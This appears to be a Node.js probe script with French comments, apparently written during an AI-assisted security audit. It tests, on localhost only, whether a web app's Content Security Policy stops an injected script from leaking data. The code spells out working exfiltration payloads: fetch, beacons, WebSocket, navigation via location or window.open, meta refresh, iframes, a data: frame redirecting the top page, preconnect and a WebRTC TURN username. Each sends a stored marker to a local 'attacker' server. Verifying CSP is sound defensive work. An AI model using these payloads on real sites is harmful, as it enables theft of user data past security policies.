// RECONTRÔLE ADVERSE de l'audit de sécurité (étape 8 sur 8, 17 novembre 2026), faille S10 : « le script injecté s'exécute mais ne peut RIEN envoyer ».
// La politique de contenu pose connect-src, img-src, frame-src, form-action… mais une politique de contenu ne gouverne PAS la navigation : un script qui
// s'exécute dans la page peut encore la faire PARTIR vers une adresse de l'attaquant, avec les données dans l'adresse (location, window.open, un lien cliqué
// par programme, une balise meta refresh) — et la résolution d'un nom (WebRTC, dns-prefetch/preconnect) n'est pas gouvernée non plus.
// La sonde joue ce que l'audit n'a pas joué : un « attaquant » (autre port de 127.0.0.1 = autre origine) à l'écoute, la page de l'application avec sa
// politique, et le code d'une injection qui aurait passé (exécuté dans la page par le protocole de pilotage : la politique s'applique au DOCUMENT, quel que
// soit le chemin par lequel le script est arrivé). Témoins d'abord : les six canaux de l'audit (fetch, image, balise, WebSocket, script, préchargement)
// SONT refusés (violations relevées), sinon la sonde ne regarde pas la politique. Puis les canaux nouveaux : chacun est dit « sort » ou « tient ».
// ⛔ 127.0.0.1 seulement, entreprise fictive. Ne modifie aucune page. « N ✓ · M ✗ » : un ✗ est un canal qui SORT encore (donc la phrase « ne peut rien envoyer »
// est fausse). Sortie 1 si un contrôle tombe.
const L = require('../lib.js'), fs = require('fs'), http = require('http'), dgram = require('dgram');
const SORTIE = '/tmp/claude-0/-home-user-teamop/8050f26e-cdde-5a38-bb11-ba578db16f81/scratchpad/cap/recontrole/';
const INIT_VIOL = "(() => { try { const t = window.top; t.__viol = t.__viol || []; document.addEventListener('securitypolicyviolation', e => { try { t.__viol.push(e.violatedDirective + ' ' + String(e.blockedURI).slice(0, 80)); } catch (x) {} }); } catch (x) {} })()";
const MARQUE = 'ZXQ-SORTIE-8801';
(async () => {
  fs.mkdirSync(SORTIE, { recursive: true });
  const recu = []; let portAtt = 0;
  const srv = http.createServer((q, r) => { const ch = []; q.on('data', d => ch.push(d)); q.on('end', () => { const corps = Buffer.concat(ch).toString('utf8'); recu.push({ canal: q.url.split('?')[0], methode: q.method, marque: (q.url + corps).includes(MARQUE) || decodeURIComponent(q.url).includes(MARQUE) }); r.writeHead(200, { 'content-type': 'text/html', 'access-control-allow-origin': '*' }); r.end('<title>attaquant</title>ok'); }); });
  srv.on('upgrade', (q, sock) => { recu.push({ canal: q.url.split('?')[0], methode: 'WS', marque: false }); sock.destroy(); });
  await new Promise(ok => srv.listen(0, '127.0.0.1', () => { portAtt = srv.address().port; ok(); }));
  const udp = dgram.createSocket('udp4'); const recuUdp = []; udp.on('message', (m, r) => recuUdp.push({ n: m.length, marque: m.toString('latin1').includes(MARQUE) }));
  await new Promise(ok => udp.bind(0, '127.0.0.1', ok)); const portUdp = udp.address().port;
  const ATT = 'http://127.0.0.1:' + portAtt;
  const c = await L.ouvrir({ profil: 'mac', qui: 'marc', attente: 900, init: INIT_VIOL }), p = c.p;
  await c.ctx.route(u => { const s = u.toString(); return /^https?:/.test(s) && !/^https?:\/\/127\.0\.0\.1[:/]/.test(s); }, r => r.abort('blockedbyclient'));
  const politique = await p.evaluate(() => { const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]'); return m ? m.content : ''; });
  L.v('population : la page porte sa politique de contenu (' + politique.length + ' signes)', politique.length > 200, politique.slice(0, 60));
  // ce que l'attaquant veut lire : un devis en cours, le rangement (la marque est dedans)
  await p.evaluate(m => { try { localStorage.setItem('opg_sonde_marque', m); } catch (e) {} window.__donnee = m + '|' + JSON.stringify(Object.keys(localStorage)).slice(0, 200); }, MARQUE);
  const lire = async (attente) => { await new Promise(r => setTimeout(r, attente || 900)); };
  // ── témoins : les six canaux de l'audit sont refusés ──
  await p.evaluate(A => { const D = encodeURIComponent(window.__donnee);
    try { fetch(A + '/t-fetch?d=' + D, { method: 'POST', mode: 'no-cors', body: window.__donnee }); } catch (e) {}
    try { new Image().src = A + '/t-image?d=' + D; } catch (e) {}
    try { navigator.sendBeacon(A + '/t-beacon', window.__donnee); } catch (e) {}
    try { new WebSocket(A.replace('http', 'ws') + '/t-ws'); } catch (e) {}
    try { const s = document.createElement('script'); s.src = A + '/t-script.js'; document.head.appendChild(s); } catch (e) {}
    try { const l = document.createElement('link'); l.rel = 'prefetch'; l.href = A + '/t-prefetch'; document.head.appendChild(l); } catch (e) {} }, ATT);
  await lire(1200);
  const tem = recu.filter(x => x.canal.startsWith('/t-'));
  const viol = await p.evaluate(() => (window.top.__viol || []).slice());
  console.log('  · violations relevées par le navigateur :', viol.length, viol.slice(0, 8).join(' | '));
  L.v('témoin : les six canaux de l\'audit sont refusés (0 requête reçue par l\'attaquant : ' + tem.length + ')', tem.length === 0, tem);
  L.v('témoin : le navigateur a relevé au moins 5 violations de la politique (population : sinon elle ne regarde rien)', viol.length >= 5, viol);
  // ── canaux nouveaux, chacun dans une page neuve de la même origine (une navigation ferait quitter la page) ──
  const essais = {
    'navigation (location.href)': A => { location.href = A + '/n-location?d=' + encodeURIComponent(window.__donnee); },
    'navigation (location.replace)': A => { location.replace(A + '/n-replace?d=' + encodeURIComponent(window.__donnee)); },
    'fenêtre (window.open)': A => { window.open(A + '/n-open?d=' + encodeURIComponent(window.__donnee), '_blank'); },
    'lien cliqué par programme (a.click)': A => { const a = document.createElement('a'); a.href = A + '/n-lien?d=' + encodeURIComponent(window.__donnee); a.target = '_blank'; document.body.appendChild(a); a.click(); },
    'balise meta refresh': A => { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + A + '/n-refresh?d=' + encodeURIComponent(window.__donnee); document.head.appendChild(m); },
    'cadre vers l\'attaquant (iframe)': A => { const f = document.createElement('iframe'); f.src = A + '/n-iframe?d=' + encodeURIComponent(window.__donnee); document.body.appendChild(f); },
    'cadre data: qui navigue (frame-src data:)': A => { const f = document.createElement('iframe'); f.src = 'data:text/html,' + encodeURIComponent('<script>top.location.href=' + JSON.stringify(A + '/n-datacadre?d=' + window.__donnee) + '<\/script>'); document.body.appendChild(f); },
    'préconnexion (link rel=preconnect)': A => { const l = document.createElement('link'); l.rel = 'preconnect'; l.href = A; document.head.appendChild(l); const m = document.createElement('link'); m.rel = 'dns-prefetch'; m.href = A; document.head.appendChild(m); },
  };
  const sortent = [];
  for (const [nom, fn] of Object.entries(essais)) {
    const c2 = await L.ouvrir({ profil: 'mac', qui: 'marc', attente: 800, init: INIT_VIOL });
    await c2.ctx.route(u => { const s = u.toString(); return /^https?:/.test(s) && !/^https?:\/\/127\.0\.0\.1[:/]/.test(s); }, r => r.abort('blockedbyclient'));
    await c2.p.evaluate(m => { window.__donnee = m + '|exemple'; }, MARQUE);
    const av = recu.length;
    await c2.p.evaluate(`(${fn.toString()})(${JSON.stringify(ATT)})`).catch(() => {});
    await lire(1500);
    const nouveaux = recu.slice(av).filter(x => x.canal.startsWith('/n-') || x.canal === '/');
    const avecDonnee = nouveaux.filter(x => x.marque);
    console.log('  ·', nom, '→ requêtes reçues par l\'attaquant :', nouveaux.length, '· avec la donnée :', avecDonnee.length, nouveaux.slice(0, 2).map(x => x.canal).join(','));
    // la navigation cible une adresse de l'attaquant : la politique ne la retient pas ; une requête sans donnée (préconnexion) prouve la connexion, pas la fuite
    const sort = nom.includes('préconnexion') ? nouveaux.length > 0 : avecDonnee.length > 0;
    if (sort) sortent.push(nom);
    L.v('« ' + nom + ' » ne fait rien parvenir à l\'attaquant', !sort, nouveaux.slice(0, 2));
    await L.fin(c2);
  }
  // ── WebRTC : un serveur TURN de l'attaquant (UDP) reçoit-il la donnée dans le nom d'utilisateur ? ──
  const c3 = await L.ouvrir({ profil: 'mac', qui: 'marc', attente: 800, init: INIT_VIOL });
  const rtc = await c3.p.evaluate(async ([port, marque]) => { try { const pc = new RTCPeerConnection({ iceServers: [{ urls: 'turn:127.0.0.1:' + port + '?transport=udp', username: marque, credential: 'x' }], iceTransportPolicy: 'relay' }); pc.createDataChannel('x'); await pc.setLocalDescription(await pc.createOffer()); await new Promise(r => setTimeout(r, 2500)); pc.close(); return 'ok'; } catch (e) { return 'erreur ' + e.message.slice(0, 80); } }, [portUdp, MARQUE]);
  await lire(500);
  console.log('  · WebRTC (serveur TURN de l\'attaquant en UDP) :', rtc, '· paquets reçus :', recuUdp.length, '· avec la donnée :', recuUdp.filter(x => x.marque).length);
  if (rtc === 'ok') L.v('WebRTC (nom d\'utilisateur TURN) ne fait rien parvenir à l\'attaquant', recuUdp.filter(x => x.marque).length === 0, recuUdp.slice(0, 2));
  else console.log('  · WebRTC non essayable ici :', rtc);
  await L.fin(c3); await L.fin(c);
  fs.writeFileSync(SORTIE + 'sortie.json', JSON.stringify({ sortent, recu, recuUdp, rtc, violations: viol.length }, null, 1));
  const ko = L.bilan(); await L.fermer(); try { srv.close(); udp.close(); } catch (e) {} process.exit(ko ? 1 : 0);
})().catch(async e => { console.error('SONDE EN PANNE', e); try { await L.fermer(); } catch (x) {} process.exit(2); });
